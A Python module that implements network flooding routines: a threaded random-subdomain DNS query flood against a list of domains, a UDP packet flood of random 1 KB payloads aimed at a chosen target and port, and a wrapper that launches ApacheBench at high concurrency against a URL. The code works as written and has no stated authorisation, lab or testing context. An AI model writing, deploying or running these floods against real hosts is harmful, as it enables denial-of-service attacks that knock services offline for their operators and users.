import socket
import random
import string
import time
import concurrent.futures
import subprocess
import os
import logging
import threading

logger = logging.getLogger()

def _dns_worker(domain):
    try:
        chars = string.ascii_lowercase + string.digits
        rand_sub = ''.join(random.choices(chars, k=8))
        target = f"{rand_sub}.{domain}"
        socket.gethostbyname(target)
    except Exception:
        pass

def generate_dns_flood(domains: list, count: int):
    if not domains:
        return

    logger.info(f"Generating DNS flood: {count} queries...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as exe:
        futures = []
        for _ in range(count):
            dom = random.choice(domains)
            futures.append(exe.submit(_dns_worker, dom))
        concurrent.futures.wait(futures)

def generate_udp_flood(
    target: str, 
    port: int, 
    duration: float, 
    stop_event: threading.Event, 
    ipv6: bool = False
):
    msg = f"UDP flood -> {target}:{port} for {duration}s (IPv6={ipv6})"
    logger.info(msg)
    
    family = socket.AF_INET6 if ipv6 else socket.AF_INET
    
    try:
        sock = socket.socket(family, socket.SOCK_DGRAM)
        payload = os.urandom(1024)
        end_time = time.time() + duration
        
        while time.time() < end_time:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload, (target, port))
            except Exception:
                pass
            
        sock.close()
    except Exception as e:
        logger.error(f"UDP Flood failed: {e}")

def run_high_concurrency_test(
    target_url: str, 
    requests: int, 
    concurrency: int, 
    tool_dir: str = "tool"
):
    ab_path = os.path.join(tool_dir, "ab", "ab.exe")
    if not os.path.exists(ab_path):
        logger.warning(f"AB not found at {ab_path}. Skipping.")
        return

    cmd = [
        ab_path,
        "-n", str(requests),
        "-c", str(concurrency),
        "-k",
        target_url
    ]
    
    logger.info(f"Run AB: {requests} reqs, {concurrency} conn -> {target_url}")
    try:
        result = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=120
        )
        if result.returncode != 0:
            err = result.stderr.strip()[:200]
            logger.error(f"AB failed (RC {result.returncode}): {err}")
        else:
            logger.info("AB finished successfully.")
            
    except subprocess.TimeoutExpired:
        logger.error("AB timed out.")
    except Exception as e:
        logger.error(f"Failed to run AB: {e}")